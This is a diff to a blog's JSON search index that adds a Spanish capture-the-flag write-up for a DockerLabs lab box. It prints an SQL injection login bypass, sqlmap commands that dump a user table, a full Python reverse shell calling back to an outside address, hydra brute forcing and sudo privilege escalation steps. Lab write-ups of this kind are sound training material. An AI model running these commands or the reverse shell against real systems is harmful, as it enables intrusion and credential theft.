@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "Showtime , DockerLabs",
+    "url": "/posts/showtime/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, sqli, sqli payloads",
+    "date": "2024-08-02 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Listado de ficheros y derectorios  Burp intruder  sqlmap para el volcado de bbdd  Terminal de pythonHerramientas y recursos  nmap  feroxbus...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Listado de ficheros y derectorios  Burp intruder  sqlmap para el volcado de bbdd  Terminal de pythonHerramientas y recursos  nmap  feroxbuster  payloads sqli  sqlmap  revshellReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX showtime  172.17.0.2reporteComo vemos en el reporte disponemos del http 80 y del ssh en el 22El fuzzing de ficheros y directorios no aporta interesante , asi que revisamos la web.Lo unico intersante es el panel de login y nos hace pensar en algun tipo de inyeccion lo primero es ver si da algun tipo de error al meterle comilla’ o algun tipo de payload.Es posible la inyecion sql.Despues de trastear un rato con burpsuite (asi me suelto un poco) y su intruder probando payloads encuentro uno que me funciona.'OR '' = 'Con ese traga pero no obtengo nada , lo que me indica que me falta el usuario asi que probamos con sqlmap.Con sqlmap lo primero es listar las dbs.sqlmap -u \"http://172.17.0.2/login_page/index.php\" --forms --batch --dbComo vemos nos encuentra la bbdd user ahora procedemos a que nos muestre las tablas de la bbdd que nos interesa que es users.sqlmap -u \"http://172.17.0.2/login_page/index.php\" --forms --batch -D users --tablesAhora debemos mostrar el contenido o los entries de la tabla.sqlmap -u \"http://172.17.0.2/login_page/index.php\" --forms --batch -D users -T usuarios --dumpCon el usuario joe hacemos login y nos encontramos una terminal de python que nos permite ejecutar comandos.InfiltracionSin mas demora nos mandamos una revshell y realizamos el tratamiento de la tty.import socketimport subprocessimport osdef reverse_shell():    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect(('192.168.0.112', 1188))        while True:        command = s.recv(1024).decode('utf-8')        if command.lower() == 'exit':            break        output = subprocess.run(command, shell=True, capture_output=True)        s.send(output.stdout + output.stderr)        s.close()if __name__ == \"__main__\":    reverse_shell()Una vez recibida procedemos como siempre sudo -l no aporta nada pero con find tengo suerte.find / -type f -perm 644 2&gt;/dev/null | grep tmpRevisamos el fichero que estaba oculto y parecen ser una lista de contraseñas que pueden ser utiles tanto para joe como para luciano.Primero convertimos todas en minusculas y posteriomente eliminamos la lineas vacias y la del mensaje.awk '{print tolower($0)}' .hidden_text.txt &gt; minusculas.txtsed '1,3d' minusculas.txt &gt; limpioMovimientos lateralesCon el fichero limpio podemos empezar a realizar fuerza bruta ya sea en local o con hydra.Yo lo hice con hydra obteniendo la pass de joe.Hacemos login y vemos que con sudo -l tenemos un regalito.Consultamos searchbins y obtenemos como realizar el movimiento.sudo -u luciano /usr/bin/poshYa somos luciano ahora a ser root.Ejecutando sudo -l nos indica que podemos hacer uso de un script que esta en su home.Como vemos es una revshell pero apunta a otra direccion asi que o modificamos el script o reconfiguramos nuestra red local.Vamos por lo primeroYo no caliento con la revshell y prefiero darle permisos suid a bash.Podrias modificar el contenido con sed por ejemplo o con tr creo recordar.Me creo un fichero con el contenidotouch scriptecho '#!/bin/bash     &gt; &gt; bash -p' &gt; scriptmv script script.sh sudo /bin/bash /home/luciano/script.sh  Otra mas , un saludo y gracias por leer.."
+  },
+  
+  {
     "title": "Raspberrypi 1b en 2024 sirve de algo.",
     "url": "/posts/raspberry-all/",
     "categories": "Offtopic, Raspberrypi",
